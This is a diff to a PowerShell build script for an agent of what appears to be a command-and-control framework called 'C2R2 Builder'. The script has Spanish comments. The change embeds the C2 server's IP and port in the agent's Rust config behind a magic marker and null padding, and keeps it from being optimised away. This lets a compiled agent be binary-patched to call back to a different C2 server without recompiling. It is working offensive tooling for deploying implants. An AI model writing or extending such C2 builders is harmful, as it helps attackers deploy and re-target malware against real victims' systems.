@@ -201,13 +201,46 @@ Write-Color "━━━━━━━━━━━━━━━━━━━━━━�
 
 # Generar config.rs con la IP y puerto del servidor
 Write-Color "⚙️  Configurando agent con C2 server: ${ServerIP}:${ServerPort}" Cyan
+
+# Crear cadena con marcador + IP:PORT + padding nulo (total 96 bytes)
+# Marcador: 32 bytes + Dirección máxima: 64 bytes = 96 bytes total
+$marker = "C2R2_SERVER_ADDRESS_PLACEHOLDER_"
+$serverAddress = "${ServerIP}:${ServerPort}"
+$maxAddrLen = 64
+$paddingLen = $maxAddrLen - $serverAddress.Length
+
+# Generar padding nulo usando \0
+$padding = "\0" * $paddingLen
+$paddedAddress = $marker + $serverAddress + $padding
+
 $configContent = @"
 // Generado automáticamente por C2R2 Builder v2.0
-pub const C2_SERVER: &str = "${ServerIP}:${ServerPort}";
+// IMPORTANTE: Este archivo contiene un marcador para permitir binary patching sin recompilación
+
+// Dirección del servidor C2 con marcador mágico y padding para permitir reemplazo in-place
+// Formato: "C2R2_SERVER_ADDRESS_PLACEHOLDER_" + "IP:PORT" + padding nulo (total 96 bytes)
+// El marcador permite localizar esta cadena en el binario y reemplazar la IP sin recompilar
+// NOTA: Se usa #[used] y #[no_mangle] para evitar que el compilador elimine o optimice esta constante
+#[used]
+#[no_mangle]
+pub static C2_SERVER_PADDED: &[u8; 96] = b"${paddedAddress}";
+
+/// Obtiene la dirección del servidor C2 limpia (sin marcador ni padding)
+/// Esto extrae solo la parte "IP:PORT" después del marcador
+pub fn get_c2_server() -> &'static str {
+    // El marcador tiene 32 bytes, después viene la IP:PORT
+    let without_marker = &C2_SERVER_PADDED[32..];
+    // Convertir bytes a str y remover padding nulo
+    let str_slice = std::str::from_utf8(without_marker).unwrap_or("");
+    str_slice.trim_end_matches('\0')
+}
+
+// Para compatibilidad con código existente
+pub const C2_SERVER: &str = "${serverAddress}";
 
 "@
 Set-Content -Path "agent\src\config.rs" -Value $configContent -NoNewline
-Write-Color "✓ Configuración generada" Green
+Write-Color "✓ Configuración generada con soporte para binary patching" Green
 
 cargo build --release --package agent --features $agentFeatures 2>&1 | ForEach-Object {
     if ($_ -match "error|failed") {
